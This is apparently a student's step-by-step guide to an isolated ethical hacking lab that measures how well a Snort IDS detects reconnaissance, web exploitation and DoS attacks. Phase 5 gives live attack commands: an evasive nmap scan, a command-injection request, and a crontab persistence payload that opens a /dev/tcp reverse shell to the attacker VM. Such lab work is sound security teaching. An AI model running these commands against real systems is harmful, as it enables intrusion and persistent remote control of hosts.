# 🎯 Ethical Hacking Lab - Execution Guide

**Student:** [Your Name]  
**Lab Phase:** Advanced Attack Testing  
**Date:** August 13, 2025

---

## 🚀 Quick Start Instructions

### Prerequisites Check
✅ **Completed Tasks:**
- [x] Task 1: Apache Web Server Deployed (192.168.56.10)
- [x] Task 2: Snort IDS Installed (192.168.56.11) 
- [x] Task 3: Initial Keylogger/Network Scanning Completed

### Current Status
- **Victim Server:** 192.168.56.10 (Ubuntu + Apache + vulnerable.php)
- **IDS Sensor:** 192.168.56.11 (Ubuntu + Snort monitoring)
- **Attacker Machine:** 192.168.56.12 (Kali Linux)
- **All VMs:** Running and network accessible

---

## 🔥 Phase 1: Comprehensive Network Reconnaissance

### Step 1.1: Transfer Scripts to Kali
```bash
# On Windows (your host), copy scripts to Kali VM
# The scripts are ready: recon_script.sh, exploit_script.sh, dos_script.sh
```

### Step 1.2: Set Up Monitoring
**Open 2 Terminal Windows:**

**Terminal 1 - IDS Monitoring (SSH to Sensor-IDS):**
```bash
ssh sensor-admin@192.168.56.11
sudo tail -f /var/log/snort/snort.alert.fast
```

**Terminal 2 - Attack Execution (Kali Machine):**
```bash
# Make scripts executable
chmod +x recon_script.sh exploit_script.sh dos_script.sh

# Start with reconnaissance
./recon_script.sh
```

### Step 1.3: Execute Reconnaissance Script
- Script will pause between each attack phase
- Monitor IDS alerts in real-time
- Take screenshots of alert patterns
- Document detection rates and response times

**📸 SCREENSHOT OPPORTUNITIES:**
1. Network discovery results (nmap output)
2. IDS alerts showing scan detection
3. Service enumeration results
4. Vulnerability scan findings

---

## 🎯 Phase 2: Web Application Exploitation

### Step 2.1: Launch Exploitation Script
```bash
./exploit_script.sh
```

**Attack Sequence:**
1. **Command Injection** - System information gathering
2. **XSS Attacks** - Various payload types
3. **File System Access** - Attempting privilege escalation
4. **Information Harvesting** - Configuration and log access

### Step 2.2: Monitor IDS Response
- Watch for custom rule triggers (SID: 1000001-1000008)
- Document which attacks are detected vs. missed
- Note attack signatures and patterns

**📸 SCREENSHOT OPPORTUNITIES:**
1. Command injection successful execution
2. XSS payload responses
3. IDS alerts showing web attack detection
4. System information gathered through vulnerabilities

---

## ⚡ Phase 3: Denial of Service Testing

### Step 3.1: Prepare DoS Monitoring
**Open 3rd Terminal - Victim Server Resource Monitoring:**
```bash
ssh victim-admin@192.168.56.10
# Monitor system resources during attacks
watch -n 1 "echo '=== CPU/Memory ===' && top -bn1 | head -15 && echo '=== Network ===' && ss -tuln | grep :80"
```

### Step 3.2: Execute DoS Script
```bash
./dos_script.sh
```

**DoS Attack Types:**
1. **HTTP Flood** - Request volume attacks
2. **Connection Exhaustion** - TCP/Keep-alive abuse  
3. **Application DoS** - Resource-intensive commands
4. **Network Layer** - ICMP/UDP floods
5. **Service-Specific** - SSH/HTTP header attacks

### Step 3.3: Document Service Impact
- Monitor web service response times
- Check if services become unavailable
- Measure recovery time after attacks
- Verify IDS detection of DoS patterns

**📸 SCREENSHOT OPPORTUNITIES:**
1. DoS attack execution progress
2. System resource consumption (CPU/Memory)
3. Service availability testing results  
4. IDS DoS detection alerts
5. Service recovery verification

---

## 📊 Phase 4: Analysis and Documentation

### Step 4.1: IDS Alert Analysis
```bash
# On Sensor-IDS, analyze attack detection
ssh sensor-admin@192.168.56.11

# Count total alerts generated
sudo wc -l /var/log/snort/snort.alert.fast

# Analyze attack patterns detected
sudo grep -c "Command Injection" /var/log/snort/snort.alert.fast
sudo grep -c "XSS Attack" /var/log/snort/snort.alert.fast  
sudo grep -c "DoS Attack" /var/log/snort/snort.alert.fast
sudo grep -c "SCAN" /var/log/snort/snort.alert.fast

# View latest alerts
sudo tail -20 /var/log/snort/snort.alert.fast
```

### Step 4.2: Victim Server Log Analysis  
```bash
# On Victim Server, check access logs
ssh victim-admin@192.168.56.10

# Web server access patterns
sudo tail -50 /var/log/apache2/access.log | grep vulnerable.php

# Authentication attempts
sudo grep "Failed password" /var/log/auth.log | tail -10

# System resource usage
df -h
free -m
uptime
```

### Step 4.3: Attack Success Rate Documentation
Create a summary table:

| Attack Type | Attempted | Successful | IDS Detected | Detection Rate |
|-------------|-----------|------------|--------------|----------------|
| Network Scan | ✅ | ✅ | ✅ | 100% |
| Command Injection | ✅ | ✅ | ? | ?% |
| XSS | ✅ | ✅ | ? | ?% |
| DoS - HTTP Flood | ✅ | ? | ? | ?% |
| DoS - Connection | ✅ | ? | ? | ?% |

---

## 🎭 Phase 5: Advanced Techniques (Optional)

### Step 5.1: IDS Evasion Testing
```bash
# Test various evasion techniques
nmap -sS -T1 -f -D RND:5 192.168.56.10  # Slow + fragmented + decoys
curl --user-agent "Mozilla/5.0..." "http://192.168.56.10/vulnerable.php?cmd=whoami"
```

### Step 5.2: Persistence Testing
```bash
# Attempt to establish persistence (will be detected)
curl -s "http://192.168.56.10/vulnerable.php?cmd=echo '* * * * * /bin/bash -i >& /dev/tcp/192.168.56.12/4444 0>&1' | crontab -"
```

---

## 📋 Final Documentation Checklist

### Required Screenshots:
- [ ] Network reconnaissance results
- [ ] Successful command injection execution
- [ ] XSS payload in browser/curl response  
- [ ] IDS alert log showing multiple attack detections
- [ ] DoS attack impact on system resources
- [ ] Service recovery after DoS testing
- [ ] Attack summary statistics

### Required Analysis:
- [ ] IDS detection effectiveness per attack type
- [ ] False positive/negative analysis
- [ ] Attack timeline and methodology
- [ ] System impact assessment
- [ ] Recommendations for security improvements

### Files to Include:
- [ ] `recon_script.sh` - Reconnaissance automation
- [ ] `exploit_script.sh` - Web exploitation automation
- [ ] `dos_script.sh` - DoS testing automation  
- [ ] IDS alert logs (exported)
- [ ] Web server access logs (relevant portions)
- [ ] Screenshot collection with timestamps

---

## ⚠️ Safety Reminders

1. **Lab Environment Only** - Never run these attacks outside controlled environment
2. **Resource Monitoring** - Keep monitoring victim server resources
3. **Network Isolation** - Ensure lab network is isolated from production systems
4. **Cleanup** - Kill background processes after testing
5. **Documentation** - Record everything for learning and analysis

---

## 🎯 Success Criteria

### Technical Objectives:
✅ Successfully execute reconnaissance, exploitation, and DoS attacks  
✅ Demonstrate IDS detection capabilities and limitations  
✅ Document attack methodologies and detection patterns  
✅ Analyze security effectiveness and provide recommendations

### Learning Outcomes:
- Understanding of attack methodologies and tools
- IDS configuration and monitoring experience  
- Security assessment and vulnerability analysis skills
- Ethical hacking principles and responsible disclosure

---

**🚀 Ready to begin! Start with `./recon_script.sh` and monitor your IDS alerts!**
